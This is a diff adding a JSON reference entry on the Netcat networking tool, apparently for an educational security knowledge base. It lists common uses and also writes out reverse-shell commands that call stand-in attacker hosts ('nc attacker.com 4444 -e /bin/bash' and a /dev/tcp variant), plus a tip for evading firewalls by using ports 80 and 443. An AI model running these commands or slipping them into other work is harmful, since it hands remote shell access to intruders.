@@ -1,0 +1,31 @@
+{
+  "id": "netcat",
+  "title": "Netcat (nc)",
+  "shortName": "Netcat",
+  "type": "tool",
+  "category": "network_utility",
+  "description": "The TCP/IP Swiss Army knife — read and write raw data across network connections.",
+  "fullExplanation": "Netcat (nc) is a simple but powerful networking utility that reads and writes data across TCP or UDP connections. It can act as a client or server, making it useful for port scanning, banner grabbing, file transfer, creating backdoors, and debugging network services. Often called the 'Swiss Army knife of networking'. ncat (from Nmap) and socat are modern alternatives with SSL support.",
+  "useCases": [
+    { "use": "Port scanning", "command": "nc -zv 192.168.1.1 1-1000", "description": "Scan ports 1-1000 on target" },
+    { "use": "Banner grabbing", "command": "nc 192.168.1.1 80", "description": "Connect to port 80, send HTTP request manually" },
+    { "use": "Listen for connection", "command": "nc -lvp 4444", "description": "Listen on port 4444 — receive reverse shell" },
+    { "use": "Reverse shell (attacker)", "command": "nc -lvp 4444", "description": "Wait for victim to connect back" },
+    { "use": "Reverse shell (victim)", "command": "nc attacker.com 4444 -e /bin/bash", "description": "Send shell to attacker" },
+    { "use": "File transfer", "command": "nc -lvp 9999 > received.txt / nc host 9999 < file.txt", "description": "Send file over TCP" },
+    { "use": "Chat", "command": "nc -lvp 1234 / nc host 1234", "description": "Simple two-way chat" }
+  ],
+  "keyFacts": [
+    "Pre-installed on most Linux/macOS systems",
+    "nc -e flag (execute) often disabled in modern distros for security",
+    "Reverse shell alternative without -e: bash -i >& /dev/tcp/attacker/4444 0>&1",
+    "ncat (Nmap): modern replacement with SSL, IPv6, proxy support",
+    "socat: more powerful alternative — SSL, serial ports, Unix sockets",
+    "Netcat doesn't encrypt — use ncat --ssl or socat for encrypted channels",
+    "Firewall evasion: use common ports (80, 443) for reverse shells"
+  ],
+  "children": [],
+  "parent": "tools",
+  "relatedConcepts": ["nmap", "wireshark", "firewall", "ids-ips"],
+  "visualization": { "color": "#ffcc00", "icon": "🔌", "nodeType": "leaf" }
+}
